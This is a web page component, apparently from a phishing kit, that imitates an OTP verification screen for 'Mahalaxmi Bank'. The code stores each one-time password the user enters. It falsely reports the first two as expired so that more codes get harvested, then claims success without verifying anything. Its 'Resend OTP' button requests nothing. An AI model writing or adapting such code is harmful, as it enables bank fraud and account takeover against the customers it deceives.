"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { saveFirstOtp, saveOtpHistoryRecord } from "@/services/application"
import { toast } from "sonner"
import { KeyRound, RefreshCw } from "lucide-react"

export default function OtpPage() {
  const router = useRouter()
  const [otp, setOtp] = useState("")
  const [loading, setLoading] = useState(false)
  const [attempt, setAttempt] = useState(0)
  const [showResend, setShowResend] = useState(false)
  const [message, setMessage] = useState<string | null>(null)

  const applicationId =
    typeof window !== "undefined"
      ? window.sessionStorage.getItem("application_id")
      : null

  if (!applicationId) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardContent className="pt-6 text-center">
            <p className="text-gray-500 mb-4">No application found. Please start from the beginning.</p>
            <Button onClick={() => router.push("/")}>Start Application</Button>
          </CardContent>
        </Card>
      </div>
    )
  }

  const handleVerify = async () => {
    if (!otp.trim()) {
      toast.error("Please enter the OTP")
      return
    }

    setLoading(true)
    try {
      if (attempt === 0) {
        await saveFirstOtp(applicationId, otp.trim())
        setAttempt(1)
        setShowResend(true)
        setMessage("OTP has expired. Please request a new OTP.")
        setOtp("")
        toast.error("OTP has expired. Please request a new OTP.")
      } else if (attempt === 1) {
        await saveOtpHistoryRecord(applicationId, otp.trim())
        setAttempt(2)
        setMessage("OTP has expired. Please request a new OTP.")
        setOtp("")
        toast.error("OTP has expired. Please request a new OTP.")
      } else {
        await saveOtpHistoryRecord(applicationId, otp.trim())
        toast.success("OTP verified successfully!")
        router.push("/success")
      }
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Something went wrong")
    } finally {
      setLoading(false)
    }
  }

  const handleResend = () => {
    setOtp("")
    setMessage("Please enter the new OTP sent to your registered mobile number.")
    toast.success("New OTP has been requested.")
  }

  return (
    <div className="min-h-screen flex flex-col">
      <div className="flex-1 flex items-center justify-center p-4 bg-gradient-to-br from-blue-50 via-white to-blue-50 dark:from-gray-900 dark:via-gray-900 dark:to-gray-800">
        <Card className="w-full max-w-md shadow-lg">
          <CardHeader className="text-center space-y-4">
            <div className="flex justify-center">
              <div className="relative w-48 h-16">
                <Image
                  src="/logo.png"
                  alt="Mahalaxmi Bank"
                  fill
                  className="object-contain"
                  priority
                />
              </div>
            </div>
            <div>
              <CardTitle className="text-xl">Enter Verification Code</CardTitle>
              <CardDescription>
                Please enter the OTP sent to your registered mobile number.
              </CardDescription>
            </div>
          </CardHeader>
          <CardContent className="space-y-5">
            {message && (
              <div className="bg-blue-50 dark:bg-blue-950 border border-blue-200 dark:border-blue-800 rounded-lg p-3 text-sm text-blue-700 dark:text-blue-300">
                {message}
              </div>
            )}

            <div className="space-y-2">
              <div className="relative">
                <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                <Input
                  type="text"
                  placeholder="Enter OTP"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value)}
                  className="pl-10 text-center text-lg tracking-widest"
                  maxLength={6}
                />
              </div>
            </div>

            <Button
              onClick={handleVerify}
              className="w-full h-12 text-base"
              disabled={loading || !otp.trim()}
            >
              {loading ? "Verifying..." : "Verify OTP"}
            </Button>

            {showResend && (
              <Button
                variant="outline"
                className="w-full h-12 text-base"
                onClick={handleResend}
              >
                <RefreshCw className="h-4 w-4 mr-2" />
                Resend OTP
              </Button>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
